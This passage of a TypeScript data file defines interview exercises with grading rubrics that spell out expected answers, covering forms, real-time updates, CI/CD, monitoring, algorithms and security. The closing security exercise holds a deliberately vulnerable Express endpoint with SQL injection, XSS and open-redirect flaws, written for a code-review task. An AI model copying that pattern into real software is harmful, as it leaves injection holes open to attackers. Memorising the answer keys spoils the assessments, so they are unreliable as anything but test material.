          "Multiple accessibility failures to identify: (1) `div` with `onClick` is not keyboard-focusable or announced as interactive — use `button` or `role='button'` with `tabIndex={0}` and `onKeyDown`; (2) the checkmark/circle icons are visual-only — screen readers need `aria-label` or a visually-hidden text label; (3) the delete button `×` has no accessible label — use `aria-label='Delete task: {task.title}'`; (4) the `#999` text color on white likely fails WCAG 2.1 AA contrast ratio (4.5:1 minimum) — `#999` on white is 2.85:1; (5) the task list has no semantic structure — use `ul`/`li` so screen readers announce 'list of N items'; (6) no `role='checkbox'` or `aria-checked` for the completion toggle. Evaluate whether the developer identifies at least 4 of these. Give credit for: citing specific WCAG criteria (1.4.3 for contrast, 2.1.1 for keyboard, 4.1.2 for name/role/value), providing corrected code, and explaining how to test with a screen reader.",
      },
      {
        ownerRole: 'Frontend tech lead who needs the team to write accessible code by default, not as an afterthought audit',
        ownerContext:
          "Evaluate whether the developer proposes systemic fixes, not just component fixes. Can they set up: (1) an ESLint plugin (eslint-plugin-jsx-a11y) that catches div-with-onClick and missing aria-labels at build time? (2) automated contrast checking in the design system? (3) a testing approach (axe-core in integration tests)? For the component fix, evaluate semantic HTML usage: the task list should be a `ul` with `li` items, each interactive element should be a `button`, and the completion toggle should be a checkbox. Give credit for: fixing all the issues in the code, proposing preventive measures (linting, automated tests), and explaining the business impact (enterprise customers require VPAT/WCAG compliance — this is not optional).",
      },
    ],
  },

  {
    id: uuidv5('exercise-042-form-validation'),
    title: 'The Form Validation Strategy',
    description: `Your multi-step registration form has 4 steps with 15 total fields. The current implementation validates everything on final submission — users fill out all 4 steps and then see 8 errors on fields they completed 3 minutes ago. The PM wants inline validation (validate as you go).

\`\`\`typescript
// Current validation — runs on submit
function validateForm(data: RegistrationData): string[] {
  const errors: string[] = []
  if (!data.email) errors.push('Email is required')
  if (!data.email.includes('@')) errors.push('Email is invalid')
  if (data.password.length < 8) errors.push('Password must be 8+ characters')
  if (data.password !== data.confirmPassword) errors.push('Passwords do not match')
  if (!data.companyName && data.accountType === 'business') errors.push('Company name required for business accounts')
  // ... 10 more validations
  return errors
}
\`\`\`

Redesign the validation strategy. Show: (1) when each field validates (on blur, on change, on step transition), (2) how you handle cross-field dependencies, (3) the schema definition approach, (4) how server-side validation errors integrate with client-side errors.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'frontend',
    languages: ['typescript'],
    tags: ['frontend', 'forms', 'validation'],
    topics: ['form-validation', 'zod', 'react-hook-form', 'multi-step-forms', 'user-experience', 'schema-validation'],
    variations: [
      {
        ownerRole: 'Senior frontend engineer who has built form-heavy enterprise applications and has strong opinions about validation UX',
        ownerContext:
          "Evaluate the validation strategy for UX correctness. The right approach: validate on blur (when the user leaves a field), not on change (annoying while typing). Cross-field validation (password match, company name conditional) should validate on the dependent field's blur. Step transition should validate all fields in the current step — don't let the user proceed with invalid data. Schema approach: use Zod with per-step schemas and a combined schema for final submission. Server-side errors should map to specific fields (not a generic error banner) using the same field keys as client validation. Evaluate: (1) do they handle the 'premature validation' problem — don't show 'email is required' before the user has even clicked the field? (2) do they use touched/dirty state to avoid showing errors on untouched fields? (3) do they integrate with react-hook-form or a similar library? Give credit for: a clear validation timing strategy, Zod schema per step, and proper error display UX.",
      },
      {
        ownerRole: 'UX designer who has tested registration flows with 200+ users and knows exactly where form abandonment happens',
        ownerContext:
          "Evaluate from the user's perspective. The #1 cause of form abandonment is seeing a wall of errors after completing the form. The fix: show errors incrementally as the user interacts with each field. Evaluate: (1) does the developer validate on blur, not on mount? (2) for the password match field — do they validate `confirmPassword` when either `password` or `confirmPassword` changes (the user might fix the password field first)? (3) do they show a progress indicator per step that includes validation status? (4) do they handle the 'email already exists' server error gracefully — this can only be validated server-side, so the form needs to handle async validation results. Give credit for: a user-centered validation flow, handling async server validation (email uniqueness check on blur), and acknowledging that the final submit validation is still needed as a safety net even with inline validation.",
      },
    ],
  },

  {
    id: uuidv5('exercise-043-realtime-updates'),
    title: 'The Real-Time Updates Decision',
    description: `Your project management app needs real-time updates: when one user moves a task on the board, other users viewing the same board should see it move. Currently, users must refresh to see changes.

The team proposes three approaches:
- **Option A:** Polling every 5 seconds
- **Option B:** Server-Sent Events (SSE)
- **Option C:** WebSockets

Evaluate each option for this specific use case. Make a recommendation. Then address the follow-up question: "What happens when 500 users are viewing the same board simultaneously?"`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'frontend',
    languages: [],
    tags: ['frontend', 'real-time', 'websockets'],
    topics: ['real-time-updates', 'websockets', 'server-sent-events', 'polling', 'scalability', 'connection-management'],
    variations: [
      {
        ownerRole: 'Staff engineer who has implemented real-time features at a company with 100k concurrent WebSocket connections and knows the infrastructure implications',
        ownerContext:
          "Evaluate the developer's analysis of each option. Polling: simplest to implement, works with existing HTTP infrastructure, but wastes bandwidth (99% of polls return no changes) and has 0-5s latency. SSE: unidirectional (server to client), works over HTTP/2, auto-reconnects, but is one-way — if the app needs client-to-server real-time (e.g., live cursors), SSE isn't enough. WebSockets: bidirectional, low latency, but requires sticky sessions or a pub/sub layer (Redis) for multi-server deployments. For a task board: SSE is likely the best fit — updates flow from server to client, and task moves are triggered by regular HTTP requests. For 500 concurrent users on one board: the developer should address connection limits (each SSE/WebSocket connection holds an open connection), memory usage per connection, and fan-out (one task move must be broadcast to 499 other connections). Give credit for: recommending SSE with clear justification, addressing the 500-user fan-out problem (pub/sub with Redis or a message broker), and noting that polling might be acceptable if the team has limited infrastructure capacity.",
      },
      {
        ownerRole: 'Frontend developer who has implemented optimistic UI updates and needs real-time sync to handle conflicts gracefully',
        ownerContext:
          "Evaluate from the client-side perspective. The developer should consider: (1) optimistic updates — when a user moves a task, the UI updates immediately before the server confirms; (2) conflict resolution — what if two users move the same task at the same time? Last-write-wins, or show a conflict? (3) reconnection handling — when the SSE/WebSocket connection drops, how does the client catch up on missed events (event IDs, timestamps)? (4) state reconciliation — after reconnection, does the client re-fetch the entire board or replay missed events? Give credit for: addressing optimistic updates + server confirmation, proposing a reconnection strategy with catch-up, handling the concurrent edit problem, and considering the mobile case (mobile browsers aggressively close background connections — how does the app handle that?).",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // DevOps/Infra (4 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-044-cicd-pipeline'),
    title: 'The CI/CD Pipeline Design',
    description: `Your team of 10 developers deploys a monorepo (frontend + backend + shared library) to AWS. Current process: someone runs a script on their laptop, builds locally, uploads to S3, SSH into the server, and restarts. It takes 30 minutes and has failed 3 times in the last month (wrong environment variables, untested code, partial deploys).

Design a CI/CD pipeline from scratch. Show: every stage from git push to production traffic, including: linting, testing, building, staging deployment, approval, production deployment, and rollback. Choose specific tools and justify each choice.`,
    duration: 30,
    difficulty: 'hard',
    type: 'whiteboard',
    category: 'devops',
    languages: [],
    tags: ['devops', 'cicd', 'automation'],
    topics: ['cicd', 'github-actions', 'deployment-pipeline', 'environment-management', 'rollback', 'monorepo'],
    variations: [
      {
        ownerRole: 'Staff DevOps engineer who has built CI/CD pipelines for 5 different companies and has a zero-tolerance policy for manual deployment steps',
        ownerContext:
          "Evaluate the pipeline design for completeness and correctness. Required stages: (1) lint + type check (fast fail — catches obvious issues in < 1 min); (2) unit tests (parallel per workspace); (3) build (all workspaces); (4) integration tests (against a test database); (5) deploy to staging (automatic on main branch merge); (6) manual or automated approval gate; (7) production deploy (blue-green or canary); (8) smoke tests post-deploy; (9) automatic rollback if smoke tests fail. For the monorepo: evaluate whether the developer uses affected-package detection (only test/build what changed) or always builds everything. For tool choices: GitHub Actions is the simplest for a GitHub monorepo. Evaluate whether the developer addresses: (1) environment variable management (secrets in CI, not in code); (2) the partial deploy problem (frontend and backend must deploy atomically or in the right order); (3) caching (node_modules, build artifacts) for speed. Give credit for a complete pipeline that eliminates every manual step.",
      },
      {
        ownerRole: 'Engineering manager who has been the one running the manual deploy script and is tired of weekend deploy emergencies',
        ownerContext:
          "Evaluate the developer's focus on reliability over sophistication. The pipeline should eliminate the three failure modes: (1) wrong environment variables — managed through CI secrets, not human memory; (2) untested code — tests must pass before deploy is even possible; (3) partial deploys — atomic deployment or coordinated rollout. Evaluate whether the developer proposes: (1) a staging environment that mirrors production (same infra, same env vars, different data); (2) a rollback mechanism that takes < 5 minutes (revert to previous container image, not a full rebuild); (3) deployment notifications (Slack alert when deploy starts, succeeds, or fails). Give credit for: prioritizing reliability over features, proposing a pipeline that a developer can understand in 15 minutes (not a 500-line YAML file), and including monitoring post-deploy (error rate spike → auto-rollback).",
      },
    ],
  },

  {
    id: uuidv5('exercise-045-container-orchestration'),
    title: 'The Container Orchestration Decision',
    description: `Your company runs 6 services in Docker containers on 3 EC2 instances. Deployments are manual: SSH in, pull the new image, restart the container. Last month, one instance ran out of memory and two services went down silently — nobody noticed for 2 hours.

The team needs container orchestration. The options discussed are:
- **Option A:** Kubernetes (EKS)
- **Option B:** AWS ECS with Fargate
- **Option C:** Docker Swarm

Your team has 2 backend developers and 0 dedicated DevOps engineers. Evaluate each option and make a recommendation. Then design the deployment architecture with your chosen tool.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'devops',
    languages: [],
    tags: ['devops', 'containers', 'orchestration'],
    topics: ['kubernetes', 'ecs', 'docker-swarm', 'container-orchestration', 'auto-scaling', 'health-checks'],
    variations: [
      {
        ownerRole: 'Platform engineer who has operated both EKS and ECS in production and has strong opinions about when Kubernetes is and isn\'t appropriate',
        ownerContext:
          "Evaluate the developer's judgment about complexity vs. capability. For 6 services with 2 backend developers and no DevOps: Kubernetes (EKS) is almost certainly overkill — the learning curve and operational overhead will consume the team. Docker Swarm is too limited (no auto-scaling, limited health check options, questionable future). ECS with Fargate is the pragmatic choice: managed infrastructure (no EC2 instances to maintain), simple service definitions, built-in health checks and auto-restart, and the team can learn it in a week. Evaluate whether the developer: (1) correctly assesses team capacity as the primary constraint; (2) addresses the original problems (silent failures → health checks + alerting; manual deploys → ECS service updates); (3) explains what they'd lose by not choosing Kubernetes (advanced traffic management, service mesh, custom CRDs). Give credit for recommending the simplest tool that solves the stated problems, and defining the trigger for upgrading to Kubernetes later.",
      },
      {
        ownerRole: 'CTO of the startup who has a $50k/month AWS bill and needs the solution to be cost-efficient',
        ownerContext:
          "Evaluate cost awareness. EKS adds $72/month per cluster ($0.10/hour) plus EC2 costs for worker nodes. ECS with Fargate charges per vCPU/GB-hour with no cluster fee — for 6 small services, this is likely cheaper than running 3 EC2 instances. Docker Swarm has no AWS cost but requires self-managed EC2 instances. The developer should estimate monthly costs for each option. Evaluate whether they consider: (1) right-sizing containers (don't allocate 2GB RAM to a service that uses 256MB); (2) spot instances or Fargate Spot for non-critical services; (3) the hidden cost of Kubernetes — even managed EKS requires significant developer time for configuration, which is expensive at a startup. Give credit for: concrete cost estimates, recommending Fargate for operational simplicity, and noting that the 2-hour silent outage is the most expensive problem to fix (customer impact, reputation damage).",
      },
    ],
  },

  {
    id: uuidv5('exercise-046-blue-green-deploy'),
    title: 'The Blue-Green Deployment',
    description: `Your SaaS application currently deploys by stopping the old version and starting the new one — there's a 30-60 second window where the app is completely down. The sales team has told you that two enterprise customers mentioned this downtime in renewal conversations.

Design a blue-green (or canary) deployment strategy. Show: (1) the infrastructure setup (load balancer, two environments), (2) the deployment process step by step, (3) how you handle database migrations that are needed by the new version but would break the old version, (4) the rollback process. Address the constraint: you only have budget for 1.5x your current infrastructure, not 2x.`,
    duration: 25,
    difficulty: 'medium',
    type: 'whiteboard',
    category: 'devops',
    languages: [],
    tags: ['devops', 'deployment', 'zero-downtime'],
    topics: ['blue-green-deployment', 'canary-deployment', 'zero-downtime', 'database-migrations', 'load-balancing', 'rollback'],
    variations: [
      {
        ownerRole: 'Senior SRE who has implemented blue-green deployments for 4 different production systems and knows the database migration problem is the hardest part',
        ownerContext:
          "Evaluate the deployment design for correctness and the database migration strategy specifically. Blue-green: two identical environments, one active (blue), one idle (green). Deploy new version to green, run smoke tests, switch traffic at the load balancer. Rollback: switch traffic back to blue. The database problem: if the new version adds a column that the old version doesn't know about, the migration must be backward-compatible. Expand-contract pattern: add the column (compatible with both versions), deploy new version, then clean up in a later migration. For the 1.5x budget constraint: canary deployment (10% of traffic to new version) uses less infrastructure than full blue-green. Evaluate whether the developer: (1) addresses the database migration timing problem explicitly; (2) proposes health checks before switching traffic; (3) includes a monitoring window after the switch (watch error rates for 10 minutes before decommissioning the old environment); (4) handles the budget constraint realistically.",
      },
      {
        ownerRole: 'VP of Sales who has personally been on calls where customers asked about uptime SLAs and deployment windows',
        ownerContext:
          "Evaluate from the business perspective. The developer should understand that zero-downtime deployment is a sales enabler — enterprise customers expect 99.9%+ uptime. Evaluate: (1) does the deployment strategy genuinely achieve zero downtime, or does it just reduce downtime to < 5 seconds? (2) can the developer articulate the SLA improvement in terms customers understand ('we deploy multiple times per week with zero user impact')? (3) does the rollback process also have zero downtime? (4) does the developer propose a maintenance page or status page for the rare case when something goes wrong? Give credit for: a credible zero-downtime design, considering the customer communication angle (status page, changelog), and proposing monitoring that proves uptime to customers (uptime monitoring with a public status page).",
      },
    ],
  },

  {
    id: uuidv5('exercise-047-monitoring-alerting'),
    title: 'The Monitoring and Alerting Strategy',
    description: `Your team has no monitoring. You find out about problems when customers email support, or when a developer happens to check the logs. Last week, the API returned 500 errors for 3 hours before anyone noticed.

Design a monitoring and alerting system for your application (2 backend services, 1 frontend, 1 database). Define: (1) what metrics to collect (and from where), (2) what dashboards to build, (3) what alerts to set up (with specific thresholds), (4) the on-call rotation and escalation policy, (5) what tool(s) you would use. Budget: $500/month.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'devops',
    languages: [],
    tags: ['devops', 'monitoring', 'observability'],
    topics: ['monitoring', 'alerting', 'observability', 'metrics', 'logging', 'on-call', 'sla'],
    variations: [
      {
        ownerRole: 'Staff SRE who has built monitoring systems from scratch at 3 companies and believes that the first 5 alerts are the only ones that matter',
        ownerContext:
          "Evaluate the monitoring strategy for signal-to-noise ratio. Too many alerts = alert fatigue = ignored alerts. The essential metrics: (1) error rate (5xx responses / total responses) — alert at > 1% for 5 minutes; (2) latency (p50, p95, p99) — alert when p99 exceeds 2 seconds for 10 minutes; (3) availability (health check endpoints) — alert immediately on failure; (4) database connection pool usage — alert at 80%; (5) disk/memory/CPU — alert at 85%. Dashboards: one per service showing golden signals (latency, traffic, errors, saturation). Tool choice: Grafana Cloud or Datadog for $500/month covers small infrastructure. Evaluate whether the developer: (1) defines meaningful thresholds (not 'alert on any error' but 'alert when error rate exceeds normal baseline'); (2) has an escalation policy (page on-call → if no acknowledgment in 10 min → page backup → if no ack in 15 min → page engineering manager); (3) distinguishes between 'alerting' (wake someone up) and 'informational' (Slack notification). Give credit for: prioritizing the five most important alerts, avoiding alert fatigue, and including log aggregation for debugging after an alert fires.",
      },
      {
        ownerRole: 'Engineering manager who was personally responsible for the 3-hour undetected outage and is determined to never let it happen again',
        ownerContext:
          "Evaluate the developer's ability to design a system that would have caught the specific incident: 500 errors for 3 hours. The minimum viable monitoring: an endpoint health check every 60 seconds that triggers a PagerDuty alert on 3 consecutive failures. This alone would have caught the outage in 3 minutes instead of 3 hours. Evaluate whether the developer starts with this simple, high-impact solution before designing a comprehensive observability platform. Also evaluate: (1) the on-call rotation — who gets woken up? Is it fair (shared rotation, not always the same person)? (2) the escalation policy — what happens if the on-call person doesn't respond? (3) post-incident process — every alert should lead to either a fix or an alert threshold adjustment. Give credit for: starting with the highest-impact monitoring first, proposing a realistic on-call rotation for a small team, and including a monthly review of alerts (delete noisy alerts, adjust thresholds).",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Data Structures & Algorithms (5 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-048-graph-traversal'),
    title: 'The Dependency Graph',
    description: `Your build system needs to determine the correct order to build packages in a monorepo. Each package can depend on other packages. You need to:

1. Detect if there are circular dependencies (and report which packages are in the cycle)
2. Return a valid build order (topological sort)

\`\`\`typescript
// Input: adjacency list of package dependencies
const dependencies: Record<string, string[]> = {
  'app': ['ui-lib', 'api-client'],
  'ui-lib': ['design-tokens', 'utils'],
  'api-client': ['utils', 'types'],
  'design-tokens': [],
  'utils': ['types'],
  'types': []
}

// Expected output: ['types', 'design-tokens', 'utils', 'ui-lib', 'api-client', 'app']
// (any valid topological order)
\`\`\`

Implement both cycle detection and topological sort. State the time and space complexity.`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['algorithms', 'graphs', 'topological-sort'],
    topics: ['graph-traversal', 'topological-sort', 'cycle-detection', 'dfs', 'dependency-resolution', 'directed-acyclic-graph'],
    variations: [
      {
        ownerRole: 'Staff engineer who has built custom build systems and package managers and knows that dependency resolution is deceptively complex',
        ownerContext:
          "Evaluate the implementation for correctness and efficiency. Cycle detection: use DFS with three states (unvisited, in-progress, completed). A back edge to an in-progress node indicates a cycle. The developer should track the recursion stack to report WHICH packages form the cycle, not just that a cycle exists. Topological sort: post-order DFS (add to result after all dependencies are processed) or Kahn's algorithm (BFS with in-degree counting). Both are O(V + E) time, O(V) space. Evaluate: (1) does the implementation handle disconnected components? (2) does it report the cycle path, not just 'cycle detected'? (3) is the output a valid topological order (every package appears after its dependencies)? Give credit for: correct complexity analysis, handling edge cases (empty graph, single node, node with no dependencies), and explaining why topological sort is impossible when cycles exist.",
      },
      {
        ownerRole: 'Engineering manager who needs to explain to a non-technical PM why the build system sometimes builds packages in the wrong order',
        ownerContext:
          "Evaluate the developer's ability to explain the algorithm in plain terms. Can they explain topological sort without jargon — 'build the packages that have no dependencies first, then build the packages whose dependencies are all already built, repeat'? Can they explain why cycles are a problem — 'A depends on B and B depends on A, so neither can be built first'? For the implementation, evaluate correctness over cleverness — a clear DFS with comments is better than a cryptic one-liner. Give credit for: a working implementation that handles cycles gracefully (throws a descriptive error with the cycle path), clear variable naming, and the ability to explain the algorithm's correctness ('every package is added to the build order only after all its dependencies have been added').",
      },
    ],
  },

  {
    id: uuidv5('exercise-049-caching-strategies'),
    title: 'The Cache Eviction Problem',
    description: `Your application caches API responses in memory. The cache is growing unbounded and the server runs out of memory after 48 hours. You need to implement a cache with a maximum size that evicts the least useful entries.

Implement an LRU (Least Recently Used) cache with the following requirements:

\`\`\`typescript
interface Cache<K, V> {
  get(key: K): V | undefined       // O(1)
  set(key: K, value: V): void      // O(1)
  delete(key: K): boolean           // O(1)
  size: number
}

// Must support a maxSize — when full, evict the least recently used entry
// Both get() and set() count as "using" an entry
\`\`\`

Implement the LRU cache. Then explain: when would LRU be the wrong eviction strategy? What alternatives exist and when would you use them?`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['algorithms', 'caching', 'data-structures'],
    topics: ['lru-cache', 'cache-eviction', 'doubly-linked-list', 'hashmap', 'time-complexity', 'memory-management'],
    variations: [
      {
        ownerRole: 'Staff engineer who has implemented custom caches for high-throughput systems and knows the performance characteristics of every eviction strategy',
        ownerContext:
          "Evaluate the LRU implementation for correctness and O(1) guarantees. The standard implementation uses a HashMap + Doubly Linked List: the map provides O(1) key lookup, the linked list maintains access order (most recent at head, least recent at tail). On `get`: move the node to the head. On `set`: add/move to head, evict tail if over capacity. Evaluate: (1) are all operations truly O(1)? (2) does the implementation handle edge cases (set on existing key, get on missing key, delete on missing key)? (3) is the linked list implementation correct (no dangling pointers)? For alternatives: LFU (evicts least frequently used — better for power-law access patterns), TTL-based (evicts after time — better when data staleness is the concern), FIFO (simplest — fine when all entries are equally likely to be accessed). Give credit for a clean implementation, correct complexity, and a thoughtful comparison of at least 2 alternative strategies.",
      },
      {
        ownerRole: 'Senior developer who has debugged production memory leaks caused by unbounded caches and considers cache size management a critical production skill',
        ownerContext:
          "Evaluate whether the developer considers production concerns beyond the algorithm. (1) How do they size the cache — maxSize of 1,000 items? Based on what? Should it be memory-based (100MB) rather than count-based? (2) Do they add metrics (hit rate, miss rate, eviction count) so the team can tune the cache size? (3) Do they consider thread safety — if the cache is accessed concurrently (Node.js is single-threaded for JS but what about workers?), is the implementation safe? For the implementation, evaluate correctness over cleverness. In JavaScript, a simple approach using `Map` (which maintains insertion order) can serve as a basic LRU — evaluate whether the developer knows this shortcut and whether they discuss its limitations. Give credit for: a working implementation, production-readiness considerations, and explaining when LRU fails (scan resistance problem — a one-time full scan evicts all frequently-used entries).",
      },
    ],
  },

  {
    id: uuidv5('exercise-050-concurrency-patterns'),
    title: 'The Concurrency Bottleneck',
    description: `Your data import service processes CSV files with 100k rows. For each row, it needs to call an external API to enrich the data. The current implementation processes rows sequentially — one API call at a time — and takes 28 hours for a full import.

\`\`\`typescript
async function importCSV(rows: Row[]): Promise<Result[]> {
  const results: Result[] = []
  for (const row of rows) {
    const enriched = await externalApi.enrich(row) // ~1 second per call
    results.push(enriched)
  }
  return results
}
\`\`\`

The external API allows 50 concurrent requests but will return 429 (rate limit) if you exceed that. Rewrite the import function to maximize throughput while respecting the rate limit. Handle partial failures gracefully.`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['concurrency', 'rate-limiting', 'performance'],
    topics: ['concurrency', 'semaphore', 'promise-pool', 'rate-limiting', 'backpressure', 'error-handling'],
    variations: [
      {
        ownerRole: 'Staff engineer who has built high-throughput data pipelines and knows that naive Promise.all on 100k items will crash the process',
        ownerContext:
          "Evaluate the concurrency implementation for correctness and production readiness. The naive approach (Promise.all on all 100k rows) creates 100k promises simultaneously, exhausts memory, and triggers massive rate limiting. The correct approach: a concurrency limiter (semaphore) that allows at most 50 concurrent requests. Implementation options: (1) a simple pool using a counter and queue; (2) p-limit or p-queue library; (3) manual chunking with Promise.all on chunks of 50. Evaluate: (1) does the implementation actually limit to 50 concurrent requests? (2) does it handle 429 responses with retry + backoff? (3) does it handle individual row failures without aborting the entire import? (4) does it report progress (rows processed, rows failed, estimated time remaining)? Give credit for: correct concurrency limiting, retry with exponential backoff for 429s, error collection (don't stop on first failure), and noting that with 50 concurrent requests at 1 second each, 100k rows takes ~33 minutes — a 50x improvement.",
      },
      {
        ownerRole: 'Senior developer who has dealt with external API rate limits and knows that the documented limit and the actual limit are often different',
        ownerContext:
          "Evaluate the developer's defensive approach to rate limiting. The API says 50 concurrent, but in practice: (1) the limit might be enforced per IP, per API key, or per endpoint — the developer should not assume; (2) running at exactly the limit leaves no headroom for other consumers of the same API; (3) the 429 response should be handled gracefully (exponential backoff, then resume). Evaluate: (1) does the developer start with conservative concurrency (e.g., 30) and have a mechanism to adjust? (2) does the implementation handle transient failures differently from permanent failures? (3) does it write intermediate results to disk or database, so a crash at row 80k doesn't lose 80k results? (4) does it log enough to debug failures ('row 42,351 failed with 500: invalid address')? Give credit for: defensive concurrency (below the limit), intermediate persistence, comprehensive error logging, and a resume mechanism for interrupted imports.",
      },
    ],
  },

  {
    id: uuidv5('exercise-051-tree-operations'),
    title: 'The Nested Comments System',
    description: `Your application has nested comments (like Reddit). Comments are stored flat in the database with a \`parent_id\` field:

\`\`\`typescript
interface Comment {
  id: string
  parentId: string | null  // null = top-level comment
  content: string
  createdAt: Date
  authorId: string
}

// Sample data (flat from DB):
const comments: Comment[] = [
  { id: '1', parentId: null, content: 'Great article!', ... },
  { id: '2', parentId: '1', content: 'Thanks!', ... },
  { id: '3', parentId: '1', content: 'I disagree.', ... },
  { id: '4', parentId: '3', content: 'Why?', ... },
  { id: '5', parentId: null, content: 'Another thought.', ... },
]
\`\`\`

Implement: (1) a function to build the tree structure from the flat array, (2) a function to get all descendants of a given comment, (3) a function to get the depth of the deepest comment. Discuss: at what nesting depth would you stop allowing replies, and why?`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['algorithms', 'trees', 'data-structures'],
    topics: ['tree-construction', 'parent-child-relationships', 'recursive-data', 'adjacency-list', 'depth-first-traversal'],
    variations: [
      {
        ownerRole: 'Senior engineer who has built comment systems for two different social platforms and knows the performance implications of deep nesting',
        ownerContext:
          "Evaluate the tree-building algorithm for efficiency. The optimal approach builds the tree in O(n) with a single pass: create a map from id → node, then iterate and attach each node to its parent. A naive approach that searches for parents on each node is O(n²). Evaluate: (1) is the tree built in O(n)? (2) does `getDescendants` use DFS or BFS correctly? (3) does `getMaxDepth` handle empty trees and single-node trees? (4) for the depth limit question: Reddit caps at ~10 levels for UX reasons (deep nesting is unreadable on mobile). The developer should mention both UX and performance reasons — deep nesting means large trees to render and potential stack overflow in recursive rendering. Give credit for: O(n) tree construction, correct traversal implementations, handling edge cases (orphaned comments where parentId doesn't exist), and a practical answer about depth limits.",
      },
      {
        ownerRole: 'Frontend developer who has to render these nested comments and has dealt with the rendering performance of deeply nested DOM trees',
        ownerContext:
          "Evaluate from the rendering perspective. The tree-building function should produce a structure that's easy to render recursively. Evaluate: (1) does the output have a `children` array on each node? (2) are top-level comments easy to identify (parentId === null)? (3) is the sort order preserved (comments should appear in creation order within each level)? For the depth discussion: evaluate whether the developer considers DOM depth (deeply nested divs cause layout performance issues), indentation (at 10 levels, the content area is tiny), and accessibility (screen readers struggle with deeply nested lists). Give credit for: a clean tree structure, mentioning the rendering implications, and proposing a UX solution for deep threads (collapse after N levels, 'continue this thread' link like Reddit).",
      },
    ],
  },

  {
    id: uuidv5('exercise-052-hash-collisions'),
    title: 'The Hash Table Deep Dive',
    description: `You are in a technical interview. The interviewer says: "Explain what happens when two keys hash to the same bucket in a hash table. Then implement a simple hash map from scratch that handles collisions."

\`\`\`typescript
// Implement this:
class SimpleHashMap<V> {
  constructor(private capacity: number = 16) {}

  set(key: string, value: V): void { /* ... */ }
  get(key: string): V | undefined { /* ... */ }
  delete(key: string): boolean { /* ... */ }
  get size(): number { /* ... */ }
}
\`\`\`

Your implementation must: handle collisions, resize when the load factor exceeds 0.75, and work correctly with any string key. Explain the time complexity of each operation in the average and worst case.`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['algorithms', 'hash-table', 'data-structures'],
    topics: ['hash-tables', 'hash-collisions', 'chaining', 'open-addressing', 'load-factor', 'resizing', 'time-complexity'],
    variations: [
      {
        ownerRole: 'Senior engineer who interviews 5+ candidates per month and uses this question to gauge fundamental CS knowledge',
        ownerContext:
          "Evaluate the implementation for correctness and understanding. Collision handling: chaining (linked list per bucket) is the simplest approach; open addressing (linear/quadratic probing) is more cache-friendly. Either is acceptable. Key evaluation: (1) the hash function should distribute keys uniformly — a simple approach is summing char codes modulo capacity, but a better approach uses bit manipulation or FNV-1a; (2) resizing must rehash all existing entries into the new buckets (they can't just be copied because the bucket index depends on capacity); (3) average case: O(1) for get/set/delete; worst case: O(n) when all keys collide into one bucket. Give credit for: a working implementation with collision handling, correct resizing logic, awareness that the hash function quality determines real-world performance, and the ability to explain why O(1) is average-case (assumes good distribution) not guaranteed.",
      },
      {
        ownerRole: 'Computer science professor who has taught data structures for 15 years and evaluates understanding of concepts, not just code that works',
        ownerContext:
          "Evaluate conceptual understanding. Can the developer explain: (1) why we need a hash function — to convert arbitrary keys to array indices? (2) why collisions are inevitable — pigeonhole principle, infinite keys mapping to finite buckets? (3) why load factor matters — higher load factor means more collisions, slower operations? (4) why resizing is amortized O(1) — each element is rehashed at most O(log n) times across all resizes? The implementation should be clean and correct, but the explanation matters more. Give credit for: a clear mental model of how hash tables work, correct complexity analysis (especially the amortized cost of resizing), mentioning that JavaScript's Map uses a hash table internally, and discussing when a hash table is NOT the right choice (ordered data → use a tree).",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Security (4 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-053-owasp-top-ten'),
    title: 'The OWASP Code Review',
    description: `You are reviewing a new Express.js API endpoint. The developer says "it works great in staging." Find every security vulnerability.

\`\`\`typescript
app.post('/api/admin/users', async (req, res) => {
  const { email, role, redirectUrl } = req.body

  // Create user
  const result = await db.query(
    \`INSERT INTO users (email, role) VALUES ('\${email}', '\${role}') RETURNING id\`
  )

  // Send welcome email with login link
  await sendEmail({
    to: email,
    subject: 'Welcome!',
    html: \`<a href="\${redirectUrl}/login?userId=\${result.rows[0].id}">Click to login</a>\`
  })

  // Log for audit
  await db.query(
    \`INSERT INTO audit_log (action, details) VALUES ('user_created', '\${JSON.stringify(req.body)}')\`
  )

  res.json({ id: result.rows[0].id, message: \`User \${email} created\` })
})
\`\`\`

List every vulnerability, its OWASP Top 10 category, the attack vector, and the fix.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'javascript'],
    tags: ['security', 'owasp', 'code-review'],
    topics: ['sql-injection', 'xss', 'open-redirect', 'owasp-top-10', 'input-validation', 'parameterized-queries'],
    variations: [
      {
        ownerRole: 'Application security engineer who has conducted 100+ code reviews and can identify vulnerabilities by pattern recognition',
        ownerContext:
